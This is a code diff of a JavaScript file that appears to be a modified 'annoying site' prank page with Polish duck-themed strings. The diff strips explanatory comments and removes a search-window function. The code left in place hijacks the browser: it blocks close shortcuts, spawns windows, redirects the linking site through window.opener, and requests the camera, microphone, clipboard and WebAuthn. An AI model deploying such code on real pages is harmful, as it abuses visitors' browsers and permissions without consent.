@@ -75,9 +75,6 @@ function ipToNumber(ip) {
   }, 0);
 }
 
-const SEARCHES = [
-  'kaczuszka',
-]
 
 const VIDEOS = [
   'kaczka.mp4',
@@ -87,57 +84,29 @@ const VIDEOS = [
 const PHRASES = [
   'kaczuszka',
 ]
-/**
- * Array to store the child windows spawned by this window.
- */
+
 const wins = []
 
-/**
- * Count of number of clicks
- */
 let interactionCount = 0
 
-/**
- * Number of iframes injected into the page for the "super logout" functionality.
- * See superLogout().
- */
 let numSuperLogoutIframes = 0
 
-/**
- * Is this window a child window? A window is a child window if there exists a
- * parent window (i.e. the window was opened by another window so `window.opener`
- * is set) *AND* that parent is a window on the same origin (i.e. the window was
- * opened by us, not an external website)
- */
 const isChildWindow = (window.opener && isParentSameOrigin()) ||
   window.location.search.indexOf('child=true') !== -1
 
-/**
- * Is this window a parent window?
- */
 const isParentWindow = !isChildWindow
 
-/*
- * Run this code in all windows, *both* child and parent windows.
- */
 init()
 
-/**
- * Initialization code for *both* parent and child windows.
- */
 function init () {
   confirmPageUnload()
 
   interceptUserInput(event => {
     interactionCount += 1
 
-    // Prevent default behavior (breaks closing window shortcuts)
     event.preventDefault()
     event.stopPropagation()
 
-    // 'touchstart' and 'touchend' events are not able to open a new window
-    // (at least in Chrome), so don't even try. Checking `event.which !== 0` is just
-    // a clever way to exclude touch events.
     if (event.which !== 0) openWindow()
 
     startVibrateInterval()
@@ -149,8 +118,6 @@ function init () {
     speak()
     startTheramin()
 
-    // Capture key presses on the Command or Control keys, to interfere with the
-    // "Close Window" shortcut.
     if (event.key === 'Meta' || event.key === 'Control') {
       window.print()
       requestWebauthnAttestation()
@@ -162,8 +129,6 @@ function init () {
       requestPointerLock()
 
       if (!window.ApplePaySession) {
-        // Don't request TouchID on every interaction in Safari since it blocks
-        // the event loop and stops windows from moving
         requestWebauthnAttestation()
       }
       requestClipboardRead()
@@ -178,9 +143,6 @@ function init () {
   })
 }
 
-/**
- * Initialization code for child windows.
- */
 function initChildWindow () {
 
   interceptUserInput(event => {
@@ -190,38 +152,20 @@ function initChildWindow () {
   })
 }
 
-/**
- * Sites that link to theannoyingsite.com may specify `target='_blank'` to open the
- * link in a new window. For example, Messenger.com from Facebook does this.
- * However, that means that `window.opener` will be set, which allows us to redirect
- * that window. YES, WE CAN REDIRECT THE SITE THAT LINKED TO US.
- * Learn more here: https://www.jitbit.com/alexblog/256-targetblank---the-most-underestimated-vulnerability-ever/
- */
 function attemptToTakeoverReferrerWindow () {
   if (isParentWindow && window.opener && !isParentSameOrigin()) {
     window.opener.location = `${window.location.origin}/?child=true`
   }
 }
 
-/**
- * Returns true if the parent window is on the same origin. It's not enough to check
- * that `window.opener` is set, because that will also get set if a site on a
- * different origin links to theannoyingsite.com with `target='_blank'`.
- */
 function isParentSameOrigin () {
   try {
-    // May throw an exception if `window.opener` is on another origin
     return window.opener.location.origin === window.location.origin
   } catch (err) {
     return false
   }
 }
 
-/**
- * Ask the user "are you sure you want to leave this page?". In most browsers,
- * this will not actually do anything unless the user has at least one interaction
- * with the page before they close it.
- */
 function confirmPageUnload () {
   window.addEventListener('beforeunload', event => {
     speak('ale mam tutaj taka fajna maszynke na lewym monitorze!')
@@ -229,10 +173,6 @@ function confirmPageUnload () {
   })
 }
 
-/**
- * Attempt to register all possible browser-whitelisted protocols to be handled by
- * this web app instead of their default handlers.
- */
 function registerProtocolHandlers () {
   if (typeof navigator.registerProtocolHandler !== 'function') return
 
@@ -266,10 +206,6 @@ function registerProtocolHandlers () {
   })
 }
 
-/**
- * Attempt to access the user's camera and microphone, and attempt to enable the
- * torch (i.e. camera flash) if the device has one.
- */
 function requestCameraAndMic () {
   if (!navigator.mediaDevices ||
       typeof navigator.mediaDevices.getUserMedia !== 'function') {
@@ -916,33 +852,3 @@ function getRandomCoords () {
 function getRandomArrayEntry (arr) {
   return arr[Math.floor(Math.random() * arr.length)]
 }
-
-// TODO: document this
-function setupSearchWindow (win) {
-  if (!win) return
-  win.window.location = 'https://www.google.com/search?q=' + encodeURIComponent(SEARCHES[0])
-  let searchIndex = 1
-  const interval = setInterval(() => {
-    if (searchIndex >= SEARCHES.length) {
-      clearInterval(interval)
-      win.window.location = window.location.pathname
-      return
-    }
-
-    if (win.closed) {
-      clearInterval(interval)
-      onCloseWindow(win)
-      return
-    }
-
-    win.window.location = window.location.pathname
-    setTimeout(() => {
-      const { x, y } = getRandomCoords()
-      win.moveTo(x, y)
-      win.window.location = 'https://www.google.com/search?q=' + encodeURIComponent(SEARCHES[searchIndex])
-      searchIndex += 1
-    }, 500)
-  }, 2500)
-}
-
-
